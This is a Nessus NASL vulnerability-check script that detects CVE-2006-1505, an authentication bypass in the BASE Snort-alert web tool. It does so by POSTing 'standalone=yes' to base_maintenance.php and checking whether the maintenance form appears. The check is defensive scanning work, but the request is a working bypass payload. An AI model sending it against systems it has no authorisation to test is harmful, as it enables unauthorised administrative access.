#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21174);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-1505");
  script_bugtraq_id(17354);
  script_xref(name:"OSVDB", value:"24101");

  script_name(english:"BASE base_maintenance.php Authentication Bypass");
  script_summary(english:"Tries to bypass authentication in BASE");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to an
authentication bypass vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running BASE, a web-based tool for analyzing alerts
from one or more SNORT sensors. 

The version of BASE installed on the remote host allows a remote
attacker to bypass authentication to the 'base_maintenance.php' script
and then perform selected maintenance tasks." );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/project/shownotes.php?release_id=402956&group_id=103348" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to BASE version 1.2.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/base", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/base_maintenance.php");

  # Make sure the affected script exists.
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);
  # If ...
  if (
    # it does and...
    '<FORM METHOD="POST' >< res && ' ACTION="base_maintenance.php"' >< res &&
    # Use_Auth_System is enabled
    "302 Found" >< res && egrep(pattern:"^Location: +/index\.php", string:res)
  )
  {
    # Try to bypass authentication.
    postdata = string(
      #"submit=Update+Alert+Cache",
      "standalone=yes"
    );
    r = http_send_recv3(method: "POST ", item: url, version: 11, port: port,
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
      data: postdata);
    if (isnull(r)) exit(0);
    res = strcat(r[0], r[1], '\r\n', r[2]);

    # There's a problem if it looks like we got past authentication.
    if (
      "^Location: +/index\.php" >!< res &&
      'VALUE="Repair Tables">' >< res
    )
    {
      security_warning(port);
      exit(0);
    }
  }
}
